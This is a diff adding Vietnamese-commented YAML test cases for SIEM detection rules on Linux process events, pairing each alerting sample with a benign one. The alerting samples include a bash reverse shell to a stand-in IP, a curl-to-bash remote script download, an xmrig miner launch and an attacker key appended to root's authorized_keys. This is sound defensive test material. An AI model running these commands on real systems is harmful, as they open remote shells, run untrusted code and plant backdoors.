@@ -1,0 +1,69 @@
+# Ca test rule tiến trình Linux (server/rules/linux.yml): event tạo tiến trình đã chuẩn hóa (siem-procs / auditd)
+- rule: LNX-001
+  name: bash -i chuyển hướng tới /dev/tcp
+  expect: alert
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: bash, command_line: "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"}}
+- rule: LNX-001
+  name: nc kiểm tra cổng (không -e)
+  expect: none
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: nc, command_line: "nc -zv 10.0.0.5 22"}}
+
+- rule: LNX-002
+  name: httpd sinh sh
+  expect: alert
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: sh, pid: 947, command_line: "sh -c sleep 15", parent: {name: httpd}}}
+- rule: LNX-002
+  name: httpd sinh tiến trình xoay log
+  expect: none
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: rotatelogs, parent: {name: httpd}}}
+
+- rule: LNX-003
+  name: curl script từ IP lạ chạy thẳng qua bash
+  expect: alert
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: bash, command_line: "curl -s http://203.0.113.5/x.sh | bash"}}
+- rule: LNX-003
+  name: bộ cài chính thức của Docker (đã loại trừ 12/10/2026)
+  expect: none
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: sh, command_line: "curl -fsSL https://get.docker.com | sh"}}
+
+- rule: LNX-004
+  name: tiến trình xmrig
+  expect: alert
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: xmrig, command_line: "./xmrig -o stratum+tcp://pool.example:3333"}}
+- rule: LNX-004
+  name: tiến trình huấn luyện ML dùng nhiều CPU
+  expect: none
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: python3, command_line: "python3 train.py --epochs 10"}}
+
+- rule: LNX-005
+  name: 4 lệnh trinh sát khác nhau trong 4 giây
+  expect: alert
+  repeat: 4
+  vary: {field: process.name, values: [whoami, id, uname, hostname]}
+  events:
+    - {event: {category: process}, agent: {id: "001"}}
+- rule: LNX-005
+  name: một lệnh ps lặp lại (giám sát)
+  expect: none
+  repeat: 6
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: ps}}
+
+- rule: LNX-006
+  name: ghi thêm khóa vào authorized_keys
+  expect: alert
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: sh, command_line: "echo ssh-rsa AAAAB3Nza attacker >> /root/.ssh/authorized_keys"}}
+- rule: LNX-006
+  name: đọc authorized_keys
+  expect: none
+  events:
+    - {event: {category: process}, agent: {id: "001"}, process: {name: cat, command_line: "cat /root/.ssh/authorized_keys"}}
